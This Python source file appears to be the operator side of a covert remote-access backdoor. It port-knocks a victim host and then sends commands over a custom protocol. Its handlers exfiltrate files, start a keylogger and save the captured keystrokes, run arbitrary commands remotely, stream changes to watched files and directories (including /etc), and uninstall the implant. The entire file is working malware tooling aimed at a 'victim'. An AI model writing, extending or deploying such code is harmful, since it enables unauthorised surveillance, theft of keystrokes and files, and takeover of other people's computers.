import threading

from datetime import datetime
from pathlib import Path

from mods.knocking import send_port_knocks
from mods.monitoring import file_update_handler, dir_update_handler
from mods.protocol import check_for_ack, send_data, receive_data, receive_data_stream
from mods.shared import Cfg

def handle_command(cmd: str, args: list[str], state: dict) -> str:
    match cmd:
        case 'dc':
            return handle_dc(args, state)
        case 'cn':
            return handle_cn(args, state)
        case 'sf':
            return handle_sf(args)
        case 'dl':
            return handle_dl(args)
        case 'k+':
            return handle_kstart(args, state)
        case 'k-':
            return handle_kstop(args, state)
        case 'wf':
            return handle_wf(args, state)
        case 'wd':
            return handle_wd(args, state)
        case 'rn':
            return handle_rn(args)
        case 'un':
            return handle_un(args, state)
        case _:
            if len(args) > 0:
                args_bytes = b' ' + ' '.join(args).encode()
            else:
                args_bytes = b''

            send_data(cmd.encode() + args_bytes, src=Cfg.ATTACKER_IP, dst=Cfg.VICTIM_IP)
            return f'Unknown command: {cmd}'


def handle_cn(_: list[str], state: dict) -> str:
    send_port_knocks(dst=Cfg.VICTIM_IP)
    if not check_for_ack(from_ip=Cfg.VICTIM_IP, timeout=4):
        return f'Unable to connect to {Cfg.VICTIM_IP}'
    state['connected_to_victim'] = True
    return f'Connected to {Cfg.VICTIM_IP}'

def handle_sf(args: list[str]) -> str:
    filepath = Path(args[0])
    if not filepath.is_file():
        return 'Not a valid file path'
    filename = filepath.name
    send_data(b'sf ' + filename.encode(), src=Cfg.ATTACKER_IP, dst=Cfg.VICTIM_IP)
    if not check_for_ack(from_ip=Cfg.VICTIM_IP):
        return 'Victim did not reply in time'
    file_bytes = filepath.read_bytes()
    send_data(file_bytes, src=Cfg.ATTACKER_IP, dst=Cfg.VICTIM_IP)
    return f'Sent file: {filename}'

def handle_dl(args: list[str]) -> str:
    raw_path = args[0]
    filepath = Path(raw_path)
    send_data(b'dl ' + raw_path.encode(), src=Cfg.ATTACKER_IP, dst=Cfg.VICTIM_IP)
    if not check_for_ack(from_ip=Cfg.VICTIM_IP):
        return 'Victim unable to find file'
    file_bytes = receive_data(from_ip=Cfg.VICTIM_IP)
    save_path = Path(f'data/attacker/{filepath.name}')
    save_path.parent.mkdir(parents=True, exist_ok=True)
    save_path.write_bytes(file_bytes)
    return f'Downloaded file: {filepath.name}'

def handle_kstart(args: list[str], state: dict) -> str:
    send_data(b'k+', src=Cfg.ATTACKER_IP, dst=Cfg.VICTIM_IP)
    file_bytes = receive_data(from_ip=Cfg.VICTIM_IP)
    state['keylogger_started'] = True
    return file_bytes.decode()

def handle_kstop(args: list[str], state: dict) -> str:
    send_data(b'k-', src=Cfg.ATTACKER_IP, dst=Cfg.VICTIM_IP)
    file_bytes = receive_data(from_ip=Cfg.VICTIM_IP)
    timestamp = datetime.now().strftime('%H_%M_%Y_%m_%d')
    log_path = Path(f'data/attacker/keylog_{timestamp}')
    log_path.parent.mkdir(parents=True, exist_ok=True)
    log_path.write_bytes(file_bytes)
    state['keylogger_started'] = False
    return f'Keylog saved to {log_path}'

def handle_rn(args: list[str]) -> str:
    run_command = ' '.join(args)
    send_data(b'rn ' + run_command.encode('utf-8'), src=Cfg.ATTACKER_IP, dst=Cfg.VICTIM_IP)
    if not check_for_ack(from_ip=Cfg.VICTIM_IP):
        return f'Victim unable to run command: {run_command}'
    res = receive_data(from_ip=Cfg.VICTIM_IP)
    return res.decode()

def _initiate_watch(cmd_bytes: bytes, recv_thread: threading.Thread, stop_event: threading.Event) -> bool:
    recv_thread.start()
    send_data(cmd_bytes, src=Cfg.ATTACKER_IP, dst=Cfg.VICTIM_IP)
    if not check_for_ack(from_ip=Cfg.VICTIM_IP, timeout=5):
        stop_event.set()
        recv_thread.join(timeout=2)
        return False
    return True

def _watch_loop(stop_event: threading.Event, recv_thread: threading.Thread, watch_dir: Path, label: str) -> str:
    print('Type "ew" to end watch.')
    while True:
        if input().strip() == 'ew':
            send_data(b'ew', src=Cfg.ATTACKER_IP, dst=Cfg.VICTIM_IP)
            stop_event.set()
            recv_thread.join(timeout=5)
            return f'{label} watch ended. Files in {watch_dir}'

def handle_wf(args: list[str], state: dict) -> str:
    if not args:
        return 'Missing path argument'
    path = args[0]

    if path.startswith('/etc'):
        print('Unable to watch files inside /etc directory, watching entire /etc directory instead...')
        handle_wd(['/etc'], state)
    
    watch_dir = Path(f'data/watched/wf_{datetime.now().strftime("%H_%M_%Y_%m_%d")}')
    stop_event = threading.Event()
    recv_thread = threading.Thread(
        target=receive_data_stream,
        args=(Cfg.VICTIM_IP, file_update_handler(watch_dir, Path(path).name), stop_event),
        daemon=True,
    )
    if not _initiate_watch(b'wf ' + path.encode(), recv_thread, stop_event):
        return 'Invalid path on victim'
    watch_dir.mkdir(parents=True, exist_ok=True)
    return _watch_loop(stop_event, recv_thread, watch_dir, 'File')

def handle_wd(args: list[str], state: dict) -> str:
    if not args:
        return 'Missing path argument'
    path = args[0]
    watch_dir = Path(f'data/watched/wd_{datetime.now().strftime("%H_%M_%Y_%m_%d")}')
    stop_event = threading.Event()
    recv_thread = threading.Thread(
        target=receive_data_stream,
        args=(Cfg.VICTIM_IP, dir_update_handler(watch_dir), stop_event),
        daemon=True,
    )
    if not _initiate_watch(b'wd ' + path.encode(), recv_thread, stop_event):
        return 'Invalid path on victim'
    watch_dir.mkdir(parents=True, exist_ok=True)
    return _watch_loop(stop_event, recv_thread, watch_dir, 'Directory')

def handle_dc(_: list[str], state: dict) -> str:
    send_data(b'dc', src=Cfg.ATTACKER_IP, dst=Cfg.VICTIM_IP)
    state['connected_to_victim'] = False
    return f'Disconnected from victim'

def handle_un(_: list[str], state: dict) -> str:
    send_data(b'un', src=Cfg.ATTACKER_IP, dst=Cfg.VICTIM_IP)
    return f'Uninstall initiated'
